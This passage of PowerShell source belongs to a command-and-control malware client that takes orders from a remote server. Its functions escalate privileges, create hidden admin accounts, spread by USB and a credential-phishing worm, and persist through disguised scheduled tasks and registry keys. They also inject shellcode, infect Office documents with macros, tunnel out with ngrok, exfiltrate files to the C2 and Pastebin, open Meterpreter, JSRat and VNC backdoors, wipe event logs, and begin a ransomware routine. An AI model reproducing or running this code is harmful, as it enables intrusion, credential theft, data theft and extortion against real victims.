            }
        }
		Function BypassUacCommand { # !bypassuac|cmd   OR !bypassuac
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $cmd = $LatestOrder.split('|')[1] 
			[string] $rs = "" 
			if(!$cmd){
				$cmd = "powershell -exe bypass -win hidden -enc $myencoded"
			}
			$rs += Invk-EvtVwrBypass -Command "$cmd"
			$result = $rs		
			sendC2 $pc $result $id
			}
		Function Hotpotatoes {		 # !hotpotatoes|net user tater Winter2016 /add && net localgroup administrators tater /add
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $torunas = $LatestOrder.split('|')[1]
			IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/Tater.txt')
			Invoke-Tater -Trigger 2 -Command '$torunas'
			$result = Invoke-Tater -Trigger 2 -Command '$torunas' | out-string
			sendC2 $pc $result $id
			}
		Function AddUserCommand { # !adduser|johndoe|p@s5w0rd|on      on = add to domain
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $login = $LatestOrder.split('|')[1]
			[string] $passwdd = $LatestOrder.split('|')[2]
			[string] $domain = $LatestOrder.split('|')[3]
			if ($domain -eq "on") {
				net user $login $passwdd /add /domain
				net group administrators $login /add
				net group administrateurs $login /add
				} 
			else{
				net user $login $passwdd /add
				net group administrators $login /add
				net localgroup administrateurs $login /add
				}
			$result = net user $login
			sendC2 $pc $result $id
		}
	# Persistence & Propagation  > BEGIN
		Function UsbspreadCommand {  # !usbspread|on
			[CmdletBinding()] param( 
			[string]$id
			)
			$usbspreading = $LatestOrder.split('|')[1]
			$usbencoded = $myencoded
			$result = ls $USBDrive
			sendC2 $pc $result $id
			} 
			function usbinfect {
				[CmdletBinding()] param( 
				[string]$encoded
				)
			# Detect USB letter
				$USBDrive = Get-WmiObject Win32_Volume -Filter "DriveType='2'"|select -expand driveletter
				if ($USBDrive) {
				# Create folder
				 md $USBDrive\container
				# copy all files in folder
				 move $USBDrive\* $USBDrive\container
				# Create lnk
				 $WshShell = New-Object -comObject WScript.Shell
				 $Shortcut = $WshShell.CreateShortcut("$USBDrive\SecuredContent.lnk")
				 $Shortcut.TargetPath = "cmd /c PowerShell -Exec Bypass -NoL -Win Hidden -Enc $encoded;start $USBDrive\container"
				 $Shortcut.Save()
				 #move $USBDrive\* $USBDrive\container
				# Hide folder
				attrib +h $USBDrive\container
				}
			}
		Function PersistCommand { # !persist     NEW todo :   !persist|reg / startup / task / wmi
			[CmdletBinding()] param( 
			[string]$id
			)
			$method_persist = $LatestOrder.split('|')[1]
			[string] $encoded = $myencoded
            [string] $FileOnDisk =  "$env:userprofile\AppData\cmm.txt"
		##  First strike (schedule task method)			
			$payload = "powershell.exe -exe bypass -nol -win hidden -enc $encoded"
			$r1 = schtasks /create /tn OfficeUpdater-fr /tr $payload /sc onidle /i 30
			$r2 = schtasks /create /tn GoogleUpdat-us /tr $payload /sc onlogon /ru System
			$r3 = schtasks /create /tn SkypeUpdater-en /tr $payload /sc onstart /ru System
			$result = "$r1 `n $r2 `n $r3"
			
		##  Second strike (Registry method )
			$registryPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
			$registryPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
			$Name = "Version"
			$value = $payload
			New-ItemProperty -Path $registryPath1 -Name $name -Value $value -PropertyType String -Force | Out-Null
			New-ItemProperty -Path $registryPath2 -Name $name -Value $value -PropertyType String -Force | Out-Null
			
		  ##  Third strike (WMI & Startup folder method)

			if ($IsAdmin -eq $True) {
                [string] $PersistencePath = "$env:ALLUSERSPROFILE" + '\Microsoft\Windows\Start Menu\Programs\StartUp\StartUp.lnk'
				$cmd_persist = "cmd /c powershell -exec bypass -nol -win hidden -enc $encoded" 
				$command = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/wmipersist.txt');Add-Persistence $cmd_persist" 
				[string] $CmdPath = "$env:windir\System32\cmd.exe"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
						# WMI method
				}
                else {	# Startup folder method
                    [string] $PersistencePath = "$env:USERPROFILE" + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\StartUp.lnk'
                    }            
                $WScript = New-Object -ComObject Wscript.Shell
                $Shortcut = $Wscript.CreateShortcut($PersistencePath)
                $Shortcut.TargetPath = ($payload)
                $Shortcut.Save()
				sendC2 $pc $result $id
        } 		
		Function MigrateCommand{ 	 # !migrate|4223
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $pid = $LatestOrder.split('|')[1]
			$result = ps
			$result += "`n`n"
			# inject code to process $pid.  If no $pid, find "explorer" and inject into it.
			IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/migrate.txt')
			if (!$pid) {
				$pid = Get-Process explorer | select -ExpandProperty Id
				$result += Invoke-Shellcode -ProcessId $pid 
				}
				else {$result += Invoke-Shellcode -ProcessId $pid 
				}
			sendC2 $pc $result $id
			}
		Function InfectmacroCommand { # !infectmacro|C:\Users
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $Folder = $LatestOrder.split('|')[1]
			# download macro file
			$downloadURL = "$c2c/pntdr/link/macromlwr.txt"
            [string] $MacroOnDisk =  "$env:userprofile\AppData\mcr.txt"
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
				}
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$MacroOnDisk")
			#inject macro file
			IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/injctmacro.txt')
			$result = Inject-Macro -Doc $Folder -Macro $MacroOnDisk -Infect | out-string

			sendC2 $pc $result $id
			}
	#  Pivoting & Covert Channel  > BEGIN
		Function PivotCommand { # !pivot|ngrok / socks / portfwd  
		} 
			function NgrokTunnelCommand { 	 # !ngroktunnel|authkey|http|80 -- deploy ngrok or alternatves and return new public URL so you can remote connect to the zombie
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $authkey = $LatestOrder.split('|')[1]
			[string] $protocol = $LatestOrder.split('|')[2]
			[string] $port = $LatestOrder.split('|')[3]
			$exists = "$env:userprofile\AppData\svchost.exe"
			If (Test-Path $exists){
				del "$env:userprofile\AppData\tunnel.txt"
				del "$env:userprofile\AppData\svchost.exe"
			}
			$downloadURL = "$c2c/pntdr/link/tunnel.txt"
            [string] $FileOnDisk =  "$env:userprofile\tunnel.txt"
			
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			#Convert txt to exe
			Rename-Item "$env:userprofile\Appdata\tunnel.txt" "svchost.exe"
			#attrib +h "$env:userprofile\svchost.exe"			
			$command = "$env:userprofile\Appdata\svchost.exe authtoken $authkey" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Invoke-Expression $CmdString
			$command = "$env:userprofile\Appdata\svchost.exe $protocol $port" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Invoke-Expression $CmdString
			$WebClient = New-Object System.Net.WebClient
			$WebClient.DownloadFile("http://127.0.0.1:4040/index.html","$env:userprofile\Appdata\id.html")
			$result = get-content $env:userprofile\Appdata\id.html | Out-String
			sendC2 $pc $result $id
		}
			function SocksProxyCommand { # !socks|1234 -- Create a Socks 4/5 proxy on port 1234
		[CmdletBinding()] param( 
		[string]$id
		)
		[string] $bindport = $LatestOrder.split('|')[1]
		$exists = "$env:userprofile\invksocks.psm1"
		If (Test-Path $exists){
			del "$env:userprofile\invksocks.psm1"
		}
		$downloadURL = "$c2c/pntdr/link/invksocks.psm1"
        [string] $FileOnDisk =  "$env:userprofile\invksocks.psm1"
           if ($downloadURL.Substring(0,5) -ceq "https") {
               [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
           }
		$WebRequest = [System.Net.Webrequest]::create($downloadURL)
        $WebResponse = $WebRequest.GetResponse()
        $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
        $WebResponse.Close()
        $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
		#attrib +h "$env:userprofile\svchost.exe"
		Import-Module $env:userprofile\invksocks.psm1
		Invoke-SocksProxy -bindPort $bindport
		$result = "Socks ready bind on $bindport"			
		sendC2 $pc $result $id
		}
			function PortFwdCommand { 	 # !portfwd|33389|127.0.0.1|3389 -- Create a simple tcp port forward
				[CmdletBinding()] param( 
				[string]$id
				)
				[string] $bindport = $LatestOrder.split('|')[1]
				[string] $desthost = $LatestOrder.split('|')[2]
				[string] $destport = $LatestOrder.split('|')[3]
				$exists = "$env:userprofile\invksocks.psm1"
				If (Test-Path $exists){
					del "$env:userprofile\invksocks.psm1"
				}
				$downloadURL = "$c2c/pntdr/link/invksocks.psm1"
				[string] $FileOnDisk =  "$env:userprofile\invksocks.psm1"
				   if ($downloadURL.Substring(0,5) -ceq "https") {
					   [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
				   }
				$WebRequest = [System.Net.Webrequest]::create($downloadURL)
				$WebResponse = $WebRequest.GetResponse()
				$ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
				$WebResponse.Close()
				$downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
				#attrib +h "$env:userprofile\svchost.exe"
				Import-Module $env:userprofile\invksocks.psm1
				Import-Module .\Invoke-SocksProxy.psm1
				Invoke-PortFwd -bindPort $bindport -destHost $desthost -destPort $destport 
				$result = "Port forwarding ready  bind on $bindport forward to $desthost - $destport"			
				sendC2 $pc $result $id
				}
		Function CovertChannelCommand { # !covertchannel|gmail|http:\\server\config.ini
		# switch covert canal to : dns, icmp, gmail, twitter or dropbox (a BIG TASK )
		}
	#  Lateral movement
		Function WormCommand { 	 # !worm
			[CmdletBinding()] param( 
			[string]$id
			)
			$exists = "$env:userprofile\help.exe"
			If (Test-Path $exists){
				del "$env:userprofile\log.txt"
				del "$env:userprofile\help.exe"
			}
			$downloadURL = "$c2c/pntdr/link/psx.txt"
            [string] $FileOnDisk =  "$env:userprofile\log.txt"
			attrib +h "$env:userprofile\log.txt"
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			#Convert txt to exe
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\help.exe", $temp)
			attrib +h "$env:userprofile\help.exe"
			$result = ls | findstr help | Out-String
			
			$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
			$w = $ip.split('.')[0]
			$x = $ip.split('.')[1]
			$y = $ip.split('.')[2]
			$z = $ip.split('.')[3]
			$StartAddress = "$w.$x.$y"
			for($i = 1; $i -lt 254; $i++) {
				$ipAddress= "$StartAddress.$i"
				$hostName = [System.Net.Dns]::GetHostByAddress($ipAddress).Hostname
				if($hostName) {
				 Auth_spread $ipAddress $hostName
				}
			}
		function Auth_spread {
			[CmdletBinding()] param( 
				[string] $ip_target,
				[string] $host_target
				)
			Add-Type -AssemblyName "System.Drawing","System.Windows.Forms"
            [Windows.Forms.MessageBox]::Show("Criticals Windows update failed !`n Please contact your administrator", "Windows update failed", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Warning)
			$credential = Get-Credential
			$pass = $credential.GetNetworkCredential().password
			$dom = $credential.GetNetworkCredential().Domain
			$login = $credential.GetNetworkCredential().UserName
			$logindom = "$dom\$login"
			$passencrypted = convertto-securestring $pass -asplaintext -force
			$result = "$result ---- login:$logindom --- pass:$pass"
			$Creds = New-object System.Management.Automation.PSCredential $logindom,$passencrypted
			[string] $ispassvalid = IEX(New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/testcreds.txt');Test-UserCredential -user abn -password $passencrypted
                #$ispassvalid
			if ($ispassvalid -eq "False")
				{
				write-host "Authentication failed - please verify your username and password."
				Auth_spread 
				}
			else
			{
			$payload = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/pnt.txt')"
			write-host "Successfully authenticated with domain "
			$Command = "$env:userprofile\help.exe \\$ip_target -u $logindom -p $pass -h -d powershell.exe '$payload'"
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Invoke-Expression $CmdString
			#Test-WSMan $ip_target
	        #Enter-PSSession $ip_target
			#Invoke-Command -ComputerName $host_target -ScriptBlock { Set-ExecutionPolicy Unrestricted -Force } -credential $Creds
			#$payload = "calc.exe"
			#Invoke-Command -ComputerName $host_target -ScriptBlock { $payload } -credential $Creds
			del "$env:userprofile\help.exe"
			}
		}
			
			sendC2 $pc $result $id
		}
		Function PsexecCommand { 	 # !psexec|domain\admin|password|192.168.3.202|powershell.exe 'calc.exe'
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $login = $LatestOrder.split('|')[1]
			[string] $pass = $LatestOrder.split('|')[2]
			[string] $ipAddress = $LatestOrder.split('|')[3]
			[string] $cmdline = $LatestOrder.split('|')[4]
			$logindom = "$dom\$login"
			$exists = "$env:userprofile\help.exe"
			If (Test-Path $exists){
				del "$env:userprofile\log.txt"
				del "$env:userprofile\help.exe"
			}
			$downloadURL = "$c2c/pntdr/link/psx.txt"
            [string] $FileOnDisk =  "$env:userprofile\log.txt"
			
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			#Convert txt to exe
			[string]$hex = get-content -path $FileOnDisk
			[Byte[]] $temp = $hex -split ' '
			[System.IO.File]::WriteAllBytes("$env:userprofile\help.exe", $temp)
			#attrib +h "$env:userprofile\help.exe"
			#attrib +h "$env:userprofile\log.txt"
			$result = ls | findstr help | Out-String
			sendC2 $pc $result $id
			Auth_psexec $ipAddress $hostName
							
			function Auth_psexec {
				[CmdletBinding()] param( 
					[string] $ip_target
					)
				$payload = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/pnt.txt')"
				write-host "Successfully authenticated with domain "
				$Command = "$env:userprofile\help.exe \\$ip_target -u $logindom -p $pass -h -d $cmdline"
				[string] $CmdPath = "$env:windir\System32\cmd.exe"
				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
				Invoke-Expression $CmdString
				del "$env:userprofile\help.exe"
			}
			sendC2 $pc $result $id
		}


		#WMI LATERAL MOVE	
			
	#  Exfitration & Compression > BEGIN
		Function ZipCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			$source = $LatestOrder.split('|')[1]
            $destination =  $LatestOrder.split('|')[2]
			If(Test-path $destination) {Remove-item $destination}
			Add-Type -assembly "system.io.compression.filesystem"
			[io.compression.zipfile]::CreateFromDirectory($source, $destination) 
			$result = 'ok - dont forget to exfiltrate'
			sendC2 $pc $result $id
		}	
			function Zip{
			[CmdletBinding()] param( 
				[string]$Source,
				[string]$destination
			)
			If(Test-path $destination) {Remove-item $destination}
				Add-Type -assembly "system.io.compression.filesystem"
				[io.compression.zipfile]::CreateFromDirectory($Source, $destination) 
			}		
		Function Exfil-FilesCommand { 
			# Find files by extensions with a recursive search and compress the result. If param 2 (exfil) is set to "1" the zip folder will be uploaded. 
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $extension = $LatestOrder.split('|')[1]
			[string] $startfolder = $LatestOrder.split('|')[2]
			#  $exttoupload += 'doc','xls','ppt','jpg','png','bmp','pdf','txt','log'
			[string]$result = ""
			ls $startfolder*.$extension -Recurse|foreach { $path = Resolve-Path $_.FullName ; Exfiltrate $path; $name=$_.BaseName; $name="$name.$extension.$extension"; $pathlink = "<a href=$c2c/pntdr/exfil/$pc/$name>$name</a>";  $result = "$result `n  $pathlink "; }
			sendC2 $pc $result $id
			$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
			$postParams2 = @{date=$date;data=$result;pc=$pc;table='exfiltrate'}
			if ($pshversion -lt 3) {
				Curl_Add $date $result $pc 'exfiltrate'} else {
				Invoke-WebRequest -Uri "$c2c/pntdr/link/add.php" -Method POST -Body $postParams2 }
			}
		Function ExfiltrateCommand {
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $Path = $LatestOrder.split('|')[1]
			[System.Net.ServicePointManager]::ServerCertificateValidationCallback={true};
			$http=new-object System.Net.WebClient;
			[string] $url="$c2c/pntdr/exfil.php?pc=$pc";
			$exfil=$http.UploadFile($url,$Path);
			$result = $Path
			sendC2 $pc $result $id
			$date = Get-Date -Format MM/dd/yyyy-H:mm:ss
			$postParams2 = @{date=$date;data=$result;pc=$pc;table='exfiltrate'}
			if ($pshversion -lt 3) {
				Curl_Add $date $result $pc 'exfiltrate' } else {
				Invoke-WebRequest -Uri "$c2c/pntdr/link/add.php" -Method POST -Body $postParams2 }
			}
		Function Exfiltrate{
			[CmdletBinding()] param( 
				[string] $Path
				) 
			[System.Net.ServicePointManager]::ServerCertificateValidationCallback={true};
			$http = new-object System.Net.WebClient;
			[string] $url="$c2c/pntdr/exfil.php?pc=$pc";
			$exfil = $http.UploadFile($url,$Path);
			}		
        Function ExfiltratePastebin {
			Param([String]$Text)
			$postParams = @{api_dev_key='5052e0cedb40e0335e3f707bf8fce9c7';api_option='paste';api_paste_code=$Text;api_paste_name='title-of-paste';api_paste_private='2';api_user_key='0eb2184947e88844a119c70253693b92'}
			Invoke-WebRequest -Uri http://pastebin.com/api/api_post.php -Method POST -Body $postParams
			}
		Function FiletoBase64 {
			Param([String]$path)
			$FileBytes = [System.IO.File]::ReadAllBytes($path)
            $EncodedFile = [System.Convert]::ToBase64String($FileBytes)
			#$base64 = [convert]::ToBase64String((get-content $path -encoding byte))
			#$postParams = @{api_dev_key='5052e0cedb40e0335e3f707bf8fce9c7';api_option='paste';api_paste_code='$base64';api_paste_name='title-of-paste';api_paste_private='2';api_user_key='0eb2184947e88844a119c70253693b92'}
			#Invoke-WebRequest -Uri http://pastebin.com/api/api_post.php -Method POST -Body $postParams
		}
		Function SendmailCommand { # !sendmail|.\Targets.txt|subject|Hello Im your friend|c:\evil.pdf|http:/download.me|template.html
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $mailto = $LatestOrder.split('|')[1] # if empty, it select randomly 100 contacts from outlook 
			[string] $subject = $LatestOrder.split('|')[2]
			[string] $body = $LatestOrder.split('|')[3]
			[string] $file = $LatestOrder.split('|')[4]
			[string] $url = $LatestOrder.split('|')[5]
			[string] $template = $LatestOrder.split('|')[6]
			IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/sendmail.txt')
			[string] $rs = "" 
			$rs += Invoke-SendMail -TargetList "$mailto" -URL "$url" -Subject "$subject" -Body "$body <a href='URL'>link</a>" -Attachment $file -Template $template
			$rs += "`n`n "
			$result = $rs		
			sendC2 $pc $result $id
			}
		Function Get-Outlook { # exfiltrate outlook pst
			[CmdletBinding()] param( 
			[string]$id
			)
			[string]$result = ""
			ls c:\*.pst -Recurse|foreach { $path = Resolve-Path $_.FullName; $c = $_.CreationTime ; $t = dir $path; $result = "$result `n  $path `n  $t `n  $c "}
			ls d:\*.pst -Recurse|foreach { $path = Resolve-Path $_.FullName; $c = $_.CreationTime ; $t = dir $path; $result = "$result `n  $path `n  $t `n  $c "}
			$result = "$result `n`n  USE EXFILTRATION COMMAND TO EXFILTRATE OUTLOOK PST ARCHIVES OF YOUR CHOICE !"
			sendC2 $pc $result $id
			} 	
	# Shell & Code Injection > BEGIN
		Function InjectShellcode { # !shellcode|@(0x90,0x90,0xC3)
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $shellcod = $LatestOrder.split('|')[1]
			$result = ps
			$result += "`n`n"
			# inject shellcode to current process.
			IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/migrate.txt')
			$result += Invoke-Shellcode -Shellcode $shellcod 
			sendC2 $pc $result $id
			}
		Function MeterpreterShell { # !Meterpreter|LHOST|LPORT
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $Lhost = $LatestOrder.split('|')[1]
            [string] $Lport = $LatestOrder.split('|')[2]
            [string] $downloadURL = 'https://raw.githubusercontent.com/algrt/PowerSploit/master/CodeExecution/Invoke-Shellcode.txt'
            Write-Verbose "I am downloading from $ActualdownloadURL"
            $downloadedScript = (New-Object Net.WebClient).downloadString($downloadURL)
            [string] $AppendString = "Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $Lhost -Lport $Lport -force"
            $downloadedScript += $AppendString
            Invoke-Expression $downloadedScript
			$result = 'ok'
			sendC2 $pc $result $id
        }
        Function CmdBindShell {  # !BindShell|8080
            [CmdletBinding()] param( 
			[string]$id
			)
			[int32] $TcpListenerPort = $LatestOrder.split('|')[1]
			$command = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/cmdbindshell.txt');ModCmdBindShell $TcpListenerPort" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
			[string] $CmdString = "$CmdPath" + " /C " + "$Command"         
			$result ='ok'
			sendC2 $pc $result $id
        }
		Function JsRatShell{     # !jsrat|212.74.21.23
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $serverip = $LatestOrder.split('|')[1]
			$cmde = "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WinHttp.WinHttpRequest.5.1"");w=new%20ActiveXObject(""WScript.Shell"");try{v=w.RegRead(""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer"");q=v.split(""="")[1].split("";"")[0];h.SetProxy(2,q);}catch(e){}h.Open(""GET"",""http://$serverip/connect"",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe"",0,true);}"
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
			[string] $CmdString = "$CmdPath" + " /C " + "$cmde"
			Invoke-Expression $CmdString	
			$result = "Server side: powershell.exe -ExecutionPolicy Bypass -File c:\test\JSRat.txt , Modify the file and put the right IP address.  https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.txt"
			sendC2 $pc $result $id
			}
		Function VncCommand{     # !vnc|bind||5900|pass1234   OR  §vnc|reverse|publicIP_of_attacker|5500|pass1234 --Tips: use bind with tunnel command, tunnel use ngrok to expose host in public network
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $ConnectionType = $LatestOrder.split('|')[1]
			[string] $VncIPreverse = $LatestOrder.split('|')[2]
			[string] $VncPort = $LatestOrder.split('|')[3]
			[string] $VncPass = $LatestOrder.split('|')[4]
			iex (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/vnc.txt')
			if ($ConnectionType = "reverse" ) {
			Invoke-Vnc -ConType reverse -IpAddress $VncIPreverse -Port $VncPort -Password $VncPass
			} else { if ($ConnectionType = "bind" ) {
			$VncIPreverse=0
			Invoke-Vnc -ConType bind -Port $VncPort -Password $VncPass
			}}
			$result = "VNC ready - Reverse IP:$VncIPreverse Port:$VncPort Pass:$VncPass"
			sendC2 $pc $result $id
			}
		Function RDPCommand { 	 # !rdp|authkey -- Activate RDP and expose 3389 port with ngrok over Internet
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $authkey = $LatestOrder.split('|')[1]
			#Activate RDP service
			reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
			
			$exists = "$env:userprofile\AppData\svchost.exe"
			If (Test-Path $exists){
				del "$env:userprofile\AppData\tunnel.txt"
				del "$env:userprofile\AppData\svchost.exe"
			}
			$downloadURL = "$c2c/pntdr/link/tunnel.txt"
            [string] $FileOnDisk =  "$env:userprofile\tunnel.txt"
			
            if ($downloadURL.Substring(0,5) -ceq "https") {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            }
			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
            $WebResponse = $WebRequest.GetResponse()
            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
            $WebResponse.Close()
            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
			#Convert txt to exe
			Rename-Item "$env:userprofile\Appdata\tunnel.txt" "svchost.exe"
			#attrib +h "$env:userprofile\svchost.exe"
			# if !exist
			$command = "$env:userprofile\Appdata\svchost.exe authtoken $authkey" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Invoke-Expression $CmdString
			# ngrok tcp 3389
			$command = "$env:userprofile\Appdata\svchost.exe tcp 3389" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Invoke-Expression $CmdString
			$WebClient = New-Object System.Net.WebClient
			$WebClient.DownloadFile("http://127.0.0.1:4040/index.html","$env:userprofile\Appdata\id.html")
			$result = get-content $env:userprofile\Appdata\id.html | Out-String
			sendC2 $pc $result $id
		}
		Function BeefCommand {   # !beef|iexplore.exe|http://192.168.3.40:3000/demos/basic.html
            [CmdletBinding()] param( 
			[string]$id
			)
			[string] $browser = $LatestOrder.split('|')[1]
			[string] $webpage = $LatestOrder.split('|')[1]
			$IE=new-object -com internetexplorer.application
			$IE.navigate2("$webpage")
			$IE.visible=$false
			#Start-Process -WindowStyle Hidden "$browser" "$webpage"
			#Write-Verbose "Web page openned in Hidden window : $webpage"
			$result = $webpage
			sendC2 $pc $result $id
            }  
		Function PhpWebShell {   # !phpwebshell
			# deploy php.exe and tinyserver, open port 443 with netsh and run a web server. Upload and host cmd.php file. use ngrok to expose zombie in public network 
           <# /[CmdletBinding()] param( 
			[string]$id
			)
			[string] $browser = $LatestOrder.split('|')[1]
			[string] $webpage = $LatestOrder.split('|')[2]
			Start-Process -WindowStyle Hidden "$browser" "$webpage"
			Write-Verbose "Web page openned in Hidden window : $webpage"
			$result = $browser
			sendC2 $pc $result $id
            #>
			}  			
    # Defense-bypasss > BEGIN
		Function ClearEventLog { 
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) { $result = wevtutil el | Foreach-Object {wevtutil cl $_} }
			else { $result="No admin privs"}
			sendC2 $pc $result $id
			} 
		Function LogBypassCommand { # !logbypass Ivoke-phant0m
			[CmdletBinding()] param( 
			[string]$id
			)
			if ($IsAdmin -eq $True) {
			$command = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/InvkPhantom.txt');Invoke-Phant0m" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
            [string] $CmdString = "$CmdPath" + " /C " + "$Command"
            Invoke-Expression $CmdString
			$r2 = "OK, invisible mode activated against eventviewer"
			$result = "$r2"			
			} else {
			$result = "Not admin ! Run it with Tater (hotpotatoes attack): !hotpotatoes|$command `n`n !LogBypassCommand"
				}
			sendC2 $pc $result $id
			}
		Function ExtractLogCommand { #!extractlog|system
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $logFileName = $LatestOrder.split('|')[1]
			# Config
			#$logFileName # Add Name of the Logfile (System, Application, etc)
			$path = ".\" # Add Path, needs to end with a backsplash
			$exportFileName = $logFileName + (get-date -f yyyyMMdd) + ".evt"
			$logFile = Get-WmiObject Win32_NTEventlogFile | Where-Object {$_.logfilename -eq $logFileName}
			$logFile.backupeventlog($path + $exportFileName)
			$r1 = ls | findstr "$logFileName" | Out-String
			$r2 = "<a href=$c2c/pntdr/exfil/$pc/$exportFileName width=620 height=340>$exportFileName</a>"
			$result = "$r1 `n`n $r2"			
			Exfiltrate $exportFileName
			sendC2 $pc $result $id
			del $exportFileName
			}
		Function MacAttribCommand { #!macattrib|C:\secret.txt|01/03/2006 12:12 pm
			[CmdletBinding()] param( 
			[string]$id
			)
			[string] $file = $LatestOrder.split('|')[1]
            [string] $accessdate =  $LatestOrder.split('|')[2]
			$r1 = ls $file
			$command = "IEX (New-Object Net.WebClient).DownloadString('$c2c/pntdr/link/setMacAttrib.txt');Set-MacAttribute -FilePath $file -All $accessdate" 
			[string] $CmdPath = "$env:windir\System32\cmd.exe"
			[string] $CmdString = "$CmdPath" + " /C " + "$Command"	
			$r2 = ls $file
			$result ='BEFORE: $r1  `n  AFTER: $r2'
			sendC2 $pc $result $id
		}    
	# Encryption & Ransomware  > BEGIN
		Function EncryptCommand { # !encrypt|Q4dsd87rn1AE5@54fDER4584S2dZFjjk559zrlb56skgv6e6IJNF9jgnnvcE54GFF|C:\users\
			[CmdletBinding()] param( 
			[string]$id
			)
			$exists = "$env:userprofile\aex.exe"
			If (Test-Path $exists){
				del "$env:userprofile\rec.txt"
				del "$env:userprofile\aex.exe"
